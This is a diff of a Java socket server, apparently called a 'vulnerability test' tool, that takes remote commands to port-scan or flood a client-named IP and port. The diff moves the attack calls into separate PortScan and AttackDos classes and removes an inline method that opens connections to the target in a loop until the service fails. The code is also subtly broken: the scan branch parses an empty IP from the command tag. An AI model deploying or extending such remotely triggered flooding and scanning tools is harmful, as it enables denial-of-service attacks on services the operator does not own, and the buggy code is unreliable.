@@ -1,7 +1,3 @@
-/*
- * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
- * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Main.java to edit this template
- */
 package testevunerabilidadeserver;
 
 import java.io.BufferedReader;
@@ -21,13 +17,10 @@ import java.util.logging.Logger;
 public class TesteVunerabilidadeServer extends Thread{
 
     private Socket clientConnection = null;
-    
     public TesteVunerabilidadeServer(Socket clientConnection)
     {
         this.clientConnection = clientConnection;
-       
     }
-    
     public static void main(String[] args) throws IOException, InterruptedException  {
 
             try {
@@ -41,8 +34,7 @@ public class TesteVunerabilidadeServer extends Thread{
             Thread t = new TesteVunerabilidadeServer(clientConnection); 
             //colocar a Thread em funcionamento
             t.start(); 
-            }
-            
+            }  
         } catch (IOException ex) {
             Logger.getLogger(TesteVunerabilidadeServer.class.getName()).log(Level.SEVERE, null, ex);
         }      
@@ -58,30 +50,27 @@ public class TesteVunerabilidadeServer extends Thread{
         
             String dataFromClient = null;
             dataFromClient = clientReceiver.readLine();
-            
-            
+                        
             String testType = dataFromClient.substring(0,4);
             System.out.println("testType: "+testType);
             
             if(testType.equalsIgnoreCase("<PS>")){
                 String ipTarget = testType.substring(testType.indexOf(">")+1,testType.length());
-                System.out.println("ipTarget: "+ ipTarget);
+                PortScan scan = new PortScan();
                 try {
-                portScan(ipTarget, clientSender);
-            } catch (InterruptedException ex) {
-                Logger.getLogger(TesteVunerabilidadeServer.class.getName()).log(Level.SEVERE, null, ex);
-            }            
-            
+                    scan.portScan(ipTarget, clientSender);
+                } catch (InterruptedException ex) {
+                    Logger.getLogger(TesteVunerabilidadeServer.class.getName()).log(Level.SEVERE, null, ex);
+                }
+
             }
             else if(testType.equalsIgnoreCase("<DS>"))
             {
                 AttackDos attack = new AttackDos();
                 String ipTarget = dataFromClient.substring(dataFromClient.indexOf(">")+1,dataFromClient.indexOf("|"));
-                
                 String portTarget = dataFromClient.substring(dataFromClient.indexOf("|")+1,dataFromClient.length());
                 System.out.println("portTarget"+portTarget);
-                
-               attack.dosAttack(ipTarget, portTarget, clientSender);
+                attack.dosAttack(ipTarget, portTarget, clientSender);
             }
             
             
@@ -108,38 +97,11 @@ public class TesteVunerabilidadeServer extends Thread{
                 }
         }
     }
-    public void attackDos(String ipClientTarget, String servicePort, PrintStream sendToClient) throws InterruptedException
-    {
-        
-        Random aleatorio = new Random();
-        int attempts = aleatorio.nextInt((10000 - 1000) + 1) + 1000;
-        // gerar um numero randomico
-        while(true){
-            try {
-                for(int i=0;i<attempts;i++){
-                TimeUnit.SECONDS.sleep(1/1000);
-                Socket targetSocket = new Socket(ipClientTarget, Integer.parseInt(servicePort));
-                Thread attackDos = new TesteVunerabilidadeServer(targetSocket);
-                attackDos.start();
-              
-                    if(i==attempts){
-                        targetSocket.close();
-                    }
-                
-                }
-                
-            } catch (IOException ex) {
-                sendToClient.println("Número de conexões máxima atingida!!!!!!");
-                sendToClient.println("O numero de tentativas até o serviço cair foram:  "+ attempts);
-                break;
-            }
-        }
-        
-     
-    }
-    
-    
+
 }
+    
+    
+
 
     
     
